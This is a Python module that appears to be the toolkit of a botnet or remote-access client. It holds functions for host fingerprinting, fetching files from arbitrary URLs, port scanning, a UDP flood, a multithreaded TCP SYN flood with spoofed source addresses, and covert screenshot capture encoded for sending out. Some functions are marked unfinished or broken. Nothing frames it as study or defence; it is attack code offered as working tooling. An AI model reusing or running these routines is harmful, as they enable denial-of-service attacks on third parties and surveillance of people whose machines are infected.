from urllib.request import urlretrieve
from pathlib import Path
import socket, subprocess, sys, random, time, wmi, random, os, ast, socket, base64
from io import BytesIO
from threading import Thread
from multiprocessing.pool import Pool as ThreadPool
from scapy.all import *
from win32com.client import GetObject
import pyautogui

version = 1.0

def getVersion():
    return version

def getSysPlatform():
    return sys.platform

def getMachineName():
    return socket.gethostname()

def getIp():
    if sys.platform == "win32":
        proc = subprocess.Popen(["powershell.exe", '(Invoke-WebRequest -uri "http://ifconfig.me/ip").Content'], stdout=subprocess.PIPE)
    else:
        proc = subprocess.Popen(["curl", 'ifconfig.me'], stdout=subprocess.PIPE)
    return proc.stdout.read().decode('utf-8').strip()

def checkPath(dir_path):
    my_dir = Path(dir_path)
    if my_dir.is_dir():
        return True
    return False    
    
def checkFile(file_path):
    my_file = Path(file_path)
    if my_file.is_file():
        return True
    return False

#needs to fix permissions
def createPath(dir_path):
    if not checkPath(dir_path):
        os.makedirs(dir_path)
        return checkPath(dir_path)
    return True
    
#needs to fix permissions
def moveFile(file_path, file_name, destination):
    file = file_path + file_name
    if checkFile(file):
        if createPath(destination):
            os.rename(file, destination + file_name) 
            return checkFile(destination + file_name)
    
    return False
    
#needs to fix permissions
def downloadFile(url, dir_path, filename):
    if createPath(dir_path):
        file_path = dir_path + filename
        urlretrieve(url, file_path)
        if checkFile(file_path):
            return True
    return False

#does not work
def getProcessList():
    procList = None
    if 'win' in getSysPlatform():
        c = wmi.WMI()
        procList = []
        for process in c.Win32_Process():            
            procList.append({'pid': process.ProcessId, 'p_name': process.Name})
    return procList


def portScan(ip, port_list):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    openPorts = []
    for port in port_list:
        if s.connect_ex((ip, port)) == 0:
            openPorts.append(port)
    
    s.close()
    return openPorts

def getFirstOpenPort():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("", 0))
    s.listen(1)
    port = s.getsockname()[1]
    s.close()

    return port

def connectTo(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if s.connect_ex((ip, port)) == 0:
        return True
    return False

def udpFlood(ip, port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024)
    timeout =  time.time() + duration
    sent = 0
    if isinstance(port, list):
        while time.time() < timeout: 
            client.sendto(data, (ip, random.choice(port)))
            sent = sent + 1
    else:
        while time.time() < timeout: 
            client.sendto(data, (ip, port))
            sent = sent + 1

    return sent

#needs to fix permissions
def tcpSYNFlood(ip, port, packages):
    sent = 0 

    for x in range (0, packages):
        s_port = random.randint(1000,9000)
        s_eq = random.randint(1000,9000)
        w_indow =random.randint(1000,9000)

        IP_Packet = IP ()
        IP_Packet.src = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
        IP_Packet.dst = ip

        TCP_Packet = TCP ()	
        TCP_Packet.sport = s_port
        TCP_Packet.dport = port
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = w_indow

        send(IP_Packet/TCP_Packet, verbose=0)
        sent+=1

    return sent

def multiThreadAttack(func, ip, port, amount, t_amount):
    sent = 0 
    func = globals()[func]
    params = (ip, port, amount)

    pool = ThreadPool(processes=t_amount)
    for i in range(0, t_amount):
        sent =+ pool.apply_async(func, params).get()

    pool.close()
    pool.join()

    if sent > 0:
        return True, sent
    else:
        return False

def getScreenshot():
    image = pyautogui.screenshot()
    buffered = BytesIO()
    image.save(buffered, format="JPEG")
    image.close()
    return base64.b64encode(buffered.getvalue()).decode('utf-8')
